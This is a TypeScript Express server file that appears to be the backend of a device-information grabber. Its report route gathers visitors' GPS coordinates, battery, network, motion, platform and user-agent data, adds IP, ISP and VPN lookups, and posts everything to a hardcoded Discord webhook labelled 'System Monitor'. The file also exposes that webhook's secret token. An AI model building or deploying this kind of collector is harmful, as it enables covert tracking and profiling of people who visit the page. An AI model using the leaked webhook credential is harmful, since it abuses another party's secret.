import type { Express } from "express";
import type { Server } from "http";
import { storage } from "./storage";
import { api } from "@shared/routes";
import { z } from "zod";

const DISCORD_WEBHOOK_URL = "https://canary.discord.com/api/webhooks/1457050495964151929/cue_0Yvmkt49p_J8fV_M4ks3DeuDRMilywpZUAX-2StNSQVIBBWVAk13bXGP186puI73";

export async function registerRoutes(
  httpServer: Server,
  app: Express
): Promise<Server> {

  app.post(api.reports.create.path, async (req, res) => {
    try {
      const { deviceInfo } = req.body;
      
      // Enhance with server-side IP info
      // In a real deployed environment, we would use req.headers['x-forwarded-for'] or req.socket.remoteAddress
      // And query an IP API. For this demo, we'll try to fetch public IP info from the server side.
      
      let ipInfo = {};
      try {
        const ipResponse = await fetch("http://ip-api.com/json/");
        ipInfo = await ipResponse.json();
      } catch (e) {
        console.error("Failed to fetch IP info", e);
      }

      const fullReport = {
        ...deviceInfo,
        serverDetectedIpInfo: ipInfo,
        browserInfo: {
          time: new Date().toLocaleTimeString(),
          date: new Date().toLocaleDateString(),
          timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
        },
        timestamp: new Date().toISOString()
      };

      // 1. Save to DB (Optional, but good for logs)
      await storage.createReport({ data: fullReport });

      // 2. Send to Discord
      await sendToDiscord(fullReport);

      res.json({ success: true });
    } catch (err) {
      console.error("Report error:", err);
      res.status(500).json({ message: "Failed to process report" });
    }
  });

  return httpServer;
}

async function sendToDiscord(data: any) {
  const embed = {
    title: "üö® New Device Report Received",
    color: 0x00ff00, // Green
    fields: [
      {
        name: "üîã Battery",
        value: data.battery ? `Level: ${(data.battery.level * 100).toFixed(0)}%\nCharging: ${data.battery.charging ? 'Yes' : 'No'}` : "Unknown",
        inline: true
      },
      {
        name: "üìç Location",
        value: data.location ? `Lat: ${data.location.latitude}\nLong: ${data.location.longitude}\nAcc: ${data.location.accuracy}m` : "Unknown/Denied",
        inline: true
      },
      {
        name: "üåê Network (Client)",
        value: data.network ? `Type: ${data.network.effectiveType}\nDownlink: ${data.network.downlink}Mbps` : "Unknown",
        inline: true
      },
      {
        name: "üè¢ ISP & IP (Server)",
        value: data.serverDetectedIpInfo ? `IP: ${data.serverDetectedIpInfo.query}\nISP: ${data.serverDetectedIpInfo.isp}\nLoc: ${data.serverDetectedIpInfo.city}, ${data.serverDetectedIpInfo.country}\nVPN/Proxy: ${data.serverDetectedIpInfo.proxy ? 'Yes' : 'No'}` : "Unknown",
        inline: false
      },
      {
        name: "üïí Time & Language",
        value: `Time: ${data.browserInfo?.time}\nTimezone: ${data.browserInfo?.timezone}\nLang: ${data.system?.language}`,
        inline: true
      },
      {
        name: "üíª System",
        value: `Platform: ${data.system?.platform}\nCores: ${data.system?.cores}\nLang: ${data.system?.language}`,
        inline: false
      },
      {
        name: "üöÄ Speed Test",
        value: data.speedTest ? `Ping: ${data.speedTest.ping}ms\nEst. Download: ${data.speedTest.downloadMbps} Mbps` : "Not run",
        inline: true
      },
      {
        name: "üèÉ Motion",
        value: data.motion ? `Accel X: ${data.motion.acceleration?.x?.toFixed(2) || 0}` : "Unknown",
        inline: true
      }
    ],
    footer: {
      text: `User Agent: ${data.system?.userAgent?.substring(0, 100)}...`
    },
    timestamp: new Date().toISOString()
  };

  try {
    await fetch(DISCORD_WEBHOOK_URL, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        username: "System Monitor",
        embeds: [embed]
      })
    });
  } catch (error) {
    console.error("Failed to send webhook to Discord", error);
  }
}
    
